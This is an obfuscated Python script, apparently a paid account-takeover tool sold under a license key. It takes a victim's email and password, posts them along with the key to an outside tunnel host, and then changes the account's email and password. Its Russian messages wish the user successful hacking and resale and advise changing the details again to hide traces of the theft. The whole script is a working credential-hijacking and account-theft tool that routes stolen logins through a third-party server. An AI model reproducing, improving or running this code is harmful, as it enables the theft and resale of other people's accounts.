import requests #line:1
import colorama #line:2
import os #line:3
import time #line:4
from rich .console import Console #line:5
from rich_gradient import Gradient #line:6
console =Console ()#line:8
def Auth (O00OOO00O00000O0O ):#line:10
    O0OOOO0000OOOOO00 =requests .post (f"http://3d8d039c-0338-431d-8de7-0de265766170.tunnel4.com/Auth/{O00OOO00O00000O0O}")#line:11
    O0OOO00OO0OO00O00 =O0OOOO0000OOOOO00 .json ()#line:12
    return O0OOO00OO0OO00O00 #line:14
def GetID_TOKEN (O00OOO00OOOO00O0O ,O000OO0OO0OO0O0O0 ,OOOO0O0O0O0O00O0O ):#line:16
    OOOO0OO0OOOO00O0O ={"Content-Type":"application/json"}#line:19
    O00OOO0OOO00O0O0O ={"email":O00OOO00OOOO00O0O ,"password":O000OO0OO0OO0O0O0 ,"key":OOOO0O0O0O0O00O0O }#line:25
    O0O0OO0OOO0O0OOOO =requests .post (f"http://3d8d039c-0338-431d-8de7-0de265766170.tunnel4.com/GetID_TOKEN/",headers =OOOO0OO0OOOO00O0O ,json =O00OOO0OOO00O0O0O )#line:27
    OOO00OO0OOOO0OO0O =O0O0OO0OOO0O0OOOO .json ()#line:28
    if O0O0OO0OOO0O0OOOO .status_code ==200 :#line:30
        if OOO00OO0OOOO0OO0O ==3 :#line:31
            print ("ДАЖЕ НЕ ПЫТАЙСЯ КРЯКНУТЬ :D")#line:32
        if OOO00OO0OOOO0OO0O ==1 :#line:34
            O0O0OO0000O000000 =OOO00OO0OOOO0OO0O #line:35
            os .system ("cls || clear")#line:36
            print (f"Успешный логин в аккаунт :D\n{colorama.Fore.GREEN}+-------УДАЧНОГО ВЗЛОМА :)-------+"+colorama .Fore .WHITE )#line:37
            return 1 #line:38
    else :#line:39
        print (colorama .Fore .RED +"+-------ПЕЧАЛЬКА :(-------+")#line:40
        print (str (OOO00OO0OOOO0OO0O )+colorama .Fore .WHITE )#line:41
def UPDATE_TOKEN (OO0000O00O00OO000 ,O000OO00O0OO0O0OO ,OOOOO00OOO00OOOOO ):#line:43
    OOOO00O00OOOO00OO ={"Content-Type":"application/json"}#line:46
    OO0OO0O00OOO000OO ={"email":OO0000O00O00OO000 ,"password":O000OO00O0OO0O0OO ,"key":OOOOO00OOO00OOOOO }#line:52
    O0O00OOOOO0OO00OO =requests .post (f"http://3d8d039c-0338-431d-8de7-0de265766170.tunnel4.com/GetID_TOKEN/",headers =OOOO00O00OOOO00OO ,json =OO0OO0O00OOO000OO )#line:54
    O00OOO00OO000OO0O =O0O00OOOOO0OO00OO .json ()#line:55
    if O0O00OOOOO0OO00OO .status_code ==200 :#line:57
        if O00OOO00OO000OO0O ==3 :#line:58
            print ("ДАЖЕ НЕ ПЫТАЙСЯ КРЯКНУТЬ :D")#line:59
        if O00OOO00OO000OO0O ==1 :#line:61
            OO0000OOOO00O00O0 =O00OOO00OO000OO0O #line:62
            return 1 #line:63
    else :#line:64
        print (colorama .Fore .RED +"+-------ПЕЧАЛЬКА :(-------+")#line:65
        print (str (O00OOO00OO000OO0O )+colorama .Fore .WHITE )#line:66
def CHANGE_EMAIL (O0O000OO0OOOO000O ,OO0OOOO0O000OOO0O ):#line:69
    O000000OO00OOOO00 ={"Content-Type":"application/json"}#line:72
    O00OO000O00OOOOOO ={"email":O0O000OO0OOOO000O ,"key":OO0OOOO0O000OOO0O }#line:77
    O0O00000OO0O0O000 =requests .post (f"http://3d8d039c-0338-431d-8de7-0de265766170.tunnel4.com/CHANGE_EMAIL/",headers =O000000OO00OOOO00 ,json =O00OO000O00OOOOOO )#line:79
    OO0OO0000O00O000O =O0O00000OO0O0O000 .json ()#line:80
    if O0O00000OO0O0O000 .status_code ==200 :#line:82
        if OO0OO0000O00O000O ==3 :#line:83
            print ("ДАЖЕ НЕ ПЫТАЙСЯ КРЯКНУТЬ :D")#line:84
        if OO0OO0000O00O000O ==1 :#line:86
            print (colorama .Fore .GREEN +f"Почта УСПЕШНО изменена :) ~> [ {O0O000OO0OOOO000O} ]"+colorama .Fore .WHITE )#line:87
    else :#line:88
        print (colorama .Fore .RED +"+-------ПЕЧАЛЬКА :(-------+")#line:89
        print (str (OO0OO0000O00O000O )+colorama .Fore .WHITE )#line:90
def CHANGE_PASSWORD (O0OOO0OOO000OO000 ,O0OOO0OO0O000O000 ):#line:93
    O0000OOO0O0OOOO0O ={"Content-Type":"application/json"}#line:96
    O00O00OO0O0OO00OO ={"password":O0OOO0OOO000OO000 ,"key":O0OOO0OO0O000O000 }#line:101
    O0000O0OO00OOOOOO =requests .post (f"http://3d8d039c-0338-431d-8de7-0de265766170.tunnel4.com/CHANGE_PASSWORD/",headers =O0000OOO0O0OOOO0O ,json =O00O00OO0O0OO00OO )#line:103
    O0O0OOOOOOOO0OOO0 =O0000O0OO00OOOOOO .json ()#line:104
    if O0000O0OO00OOOOOO .status_code ==200 :#line:106
        if O0O0OOOOOOOO0OOO0 ==3 :#line:107
            print ("ДАЖЕ НЕ ПЫТАЙСЯ КРЯКНУТЬ :D")#line:108
        if O0O0OOOOOOOO0OOO0 ==1 :#line:110
            print (colorama .Fore .GREEN +f"Пароль УСПЕШНО изменён :) ~> [ {O0OOO0OOO000OO000} ] \n\n!Для 100% кражи советую изменить данные повторно для скрытия следов!\n        ---[ УДАЧНОЙ ПРОДАЖИ ]---"+colorama .Fore .WHITE )#line:111
    else :#line:112
        print (colorama .Fore .RED +"+-------ПЕЧАЛЬКА :(-------+")#line:113
        print (str (O0O0OOOOOOOO0OOO0 )+colorama .Fore .WHITE )#line:114
console .print (Gradient ("""⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⣀⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠴⣶⣿⣿⣿⣿⣿⣿⣿⣿⠟⠙⢻⡷⢶⣤⣀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡛⠛⠋⠉⠉⠁⠀⢐⣤⢴⣤⣀⠀⠛⠿⣷⣤⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⡄⠀⠀⠀⠀⢀⣯⣀⡴⣤⡈⠃⠀⠀⠈⠙⢿⣦⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⡄⠀⠀⠀⣿⣤⡍⢡⢛⣋⡇⠀⠀⠀⠀⠀⠙⢷⣄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⡀⠀⠀⡇⢿⡼⢤⣌⣿⡇⡀⠀⠀⠀⠀⠀⠀⠙⢆
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢼⡇⢀⣸⣇⣸⣿⣦⣿⣿⢁⠈⡤⡀⠀⠀⠀⠀⠀⠈
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢹⣷⡏⡿⢯⡻⣿⣿⠇⢇⠎⠞⣵⡷
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣷⠀⢀⡙⠾⣿⣼⣯⣾⣀⡿⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⢻⡎⣿⣿⣦⡀⠙⢿⡿⣯⣲⣶⣃
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⢸⣷⢸⣿⣞⢿⣆⠀⡀⢈⠉⠻⣿⣀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⣹⣿⣿⠀⣿⡄⣿⣿⣆⠹⣷⣼⣶⣷⣄⣾⠋
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⡅⣿⣿⢹⠀⠘⣧⢹⣿⣿⣦⡘⢧⠉⡛⠛⢿⣄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⢣⣇⡟⣿⠈⢠⠀⠹⡆⠻⣿⣿⡳⣄⠱⣌⠃⢸⡿⣦
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⢇⣾⣿⡇⢿⠀⣿⢰⠀⢻⣆⠹⣿⣿⣌⢓⢬⡛⢸⡇⠘⡖⣄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠋⣾⣿⢹⡇⠀⠀⣿⠸⣧⠀⢻⣷⡙⢏⢻⣿⣝⢦⢻⣧⠀⢹⡘⢦⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠃⢰⡟⣿⢸⡇⠀⢸⣿⠀⣿⣆⠀⢻⣟⠦⠀⢿⣿⣮⢻⣿⠀⣼⡇⡈⢻⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡿⠁⣿⠘⠁⠀⢸⣿⡄⠘⣿⡄⢠⠙⣦⠀⠈⣿⠈⠋⠃⣴⡟⢇⢻⡀⢻⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠃⠀⣿⠀⠀⠀⣿⣿⣇⠀⢹⣿⡀⢳⡄⠀⠀⣿⠀⢠⣾⢿⠁⠀⠈⣧⠀⢧
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠀⠀⢱⠀⠀⠀⣿⡏⠹⡆⠀⢹⣧⠀⢻⣆⠀⠁⢀⣿⣷⡈⠀⠀⠀⠸⣇⠸⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠙⣆⠀⢻⡄⠀⠹⣷⣄⠘⢻⡿⣷⡄⠀⠀⠀⣯
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⠀⠀⠀⠀⠀⠈⠇⠀⠀⠀⠘⠂⠀⢧⠙⣿⢦
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉

⣿⣏⢽⣟⠻⣿⢟⠟⣻⣛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿""",colors =["red","black"]))#line:140
print ("Создатель софта: @KaliMRX")#line:141
key =input ("Key: ")#line:143
auth_res =Auth (key )#line:144
if auth_res ==1 :#line:145
    email =input ("Email: ")#line:146
    passwd =input ("Password: ")#line:147
    out =GetID_TOKEN (email ,passwd ,key )#line:148
    if out ==1 :#line:150
        new_email =input ("New Email: ")#line:151
        new_passwd =input ("New Password: ")#line:152
        os .system ("cls || clear")#line:153
        CHANGE_EMAIL (new_email ,key )#line:154
        UPDATE_TOKEN (new_email ,passwd ,key )#line:155
        CHANGE_PASSWORD (new_passwd ,key )#line:156
    else :#line:157
        print ("Неверные данные!")#line:158
        exit ()#line:159
elif auth_res ==3 :#line:160
    print ("Срок ключа истек!")#line:161
else :#line:162
    print ("Неверный ключ! (Если после покупки ключа не прошел месяц напиши сюда: @KaliMRX)")#line:163
